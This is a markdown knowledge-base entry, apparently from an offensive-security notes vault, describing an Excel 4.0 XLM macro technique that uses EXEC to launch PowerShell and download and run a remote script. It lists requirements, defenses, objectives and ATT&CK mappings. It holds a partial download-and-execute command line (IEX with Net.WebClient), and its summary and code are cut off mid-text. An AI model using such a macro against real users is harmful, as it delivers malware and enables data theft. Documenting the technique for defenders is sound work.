---
id: 7f312416-8694-41ec-b053-7817652fe309
name: XLM Excel 4.0 - PowerShell Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:23.328265+00:00'
updated_at: '2023-04-10T20:36:51.929246+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Scripting|T1064 - Scripting]]'
tags:
- '[[Office - Attacks]]'
- '[[XLM Excel 4.0 - EXEC]]'
---

# XLM Excel 4.0 - PowerShell Execution

## Summary

This procedure involves using the XLM macro language in Excel 4.0 to execute a PowerShell script downloaded from a remote server. The XLM macro is created to download the PowerShell script from a remote server and then execute it on the victim's machine. This technique allows an attacker to bypass 

## Description

# Description

This procedure involves using the XLM macro language in Excel 4.0 to execute a PowerShell script downloaded from a remote server. The XLM macro is created to download the PowerShell script from a remote server and then execute it on the victim's machine. This technique allows an attacker to bypass traditional security controls such as email filters and antivirus software. The PowerShell script can be used to perform a variety of actions on the victim's machine, such as downloading and executing additional malware or exfiltrating sensitive data. This technique can be particularly effective against organizations that rely heavily on Excel for their day-to-day operations.

 

## Requirements

1. Access to a remote server to host the PowerShell script

1. Victim must have Excel 4.0 installed

1. Victim must enable macros in the Excel document

 

## Defense

1. Disable macros in Excel documents by default and only enable them for trusted documents

1. Implement email filters to block emails containing Excel documents with macros

1. Use antivirus software that can detect and block malicious Excel documents

 

## Objectives

1. Download and execute a PowerShell script on a victim's machine

1. Bypass traditional security controls such as email filters and antivirus software

1. Perform a variety of actions on the victim's machine, such as downloading and executing additional malware or exfiltrating sensitive data

 

# Instructions

1. This command downloads a PowerShell script from a remote server and executes it on the local machine using the `EXEC` macro. The PowerShell script is downloaded using the `DownloadString` method of the `System.Net.WebClient` class. The URL of the script is provided as an argument to the `DownloadString` method.

 



**Code**: [[=EXEC("poWerShell IEX(nEw-oBject nEt.webclient).Do]]



> The `EXEC` macro is used to execute the downloaded PowerShell script. The `halt()` command is used to stop the execution of the current macro. This command is useful for downloading and executing scripts from a remote server, which can be useful for automating tasks or performing reconnaissance on a target network.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Scripting|T1064 - Scripting]]

## Tags

- [[Office - Attacks]]
- [[XLM Excel 4.0 - EXEC]]


